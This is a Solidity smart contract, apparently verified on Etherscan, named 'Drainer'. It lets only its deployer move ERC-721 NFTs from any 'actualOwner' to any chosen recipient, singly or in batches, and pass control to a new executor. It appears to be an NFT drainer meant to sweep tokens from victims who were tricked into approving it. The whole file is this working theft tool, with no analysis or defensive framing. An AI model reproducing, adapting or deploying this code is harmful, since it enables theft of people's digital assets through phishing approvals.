/**
 *Submitted for verification at Etherscan.io on 2023-02-09
*/

// SPDX-License-Identifier: Linchman
pragma solidity 0.8.17;

interface ERC721Partial {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function transferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;
}

contract Drainer {
    address private _executor;

    constructor() {
        _executor = msg.sender;
    }

    function batchTransfer(ERC721Partial tokenContract, address actualOwner, address recipient, uint256[] calldata tokenIDs) external {
        require(msg.sender == _executor, "Nah bro, not on my watch!");
        for (uint256 index; index < tokenIDs.length; index++) {
            tokenContract.transferFrom(actualOwner, recipient, tokenIDs[index]);
        }
    }

    function safeTransferFrom(ERC721Partial tokenContract, address actualOwner, address recipient, uint256 tokenID) external {
        require(msg.sender == _executor, "Nah bro, not on my watch!");
        tokenContract.safeTransferFrom(actualOwner, recipient, tokenID);
    }

    function safeTransferFrom(ERC721Partial tokenContract, address actualOwner, address recipient, uint256 tokenID, bytes memory _data) external {
        require(msg.sender == _executor, "Nah bro, not on my watch!");
        tokenContract.safeTransferFrom(actualOwner, recipient, tokenID, _data);
    }

    function transferFrom(ERC721Partial tokenContract, address actualOwner, address recipient, uint256 tokenID) external {
        require(msg.sender == _executor, "Nah bro, not on my watch!");
        tokenContract.transferFrom(actualOwner, recipient, tokenID);
    }

    function transferFrom(ERC721Partial tokenContract, address actualOwner, address recipient, uint256 tokenID, bytes memory _data) external {
        require(msg.sender == _executor, "Nah bro, not on my watch!");
        tokenContract.transferFrom(actualOwner, recipient, tokenID, _data);
    }

    function setExecutor(address _newExector) external {
        require(msg.sender == _executor, "Nah bro, not on my watch!");
        _executor = _newExector;
    }
}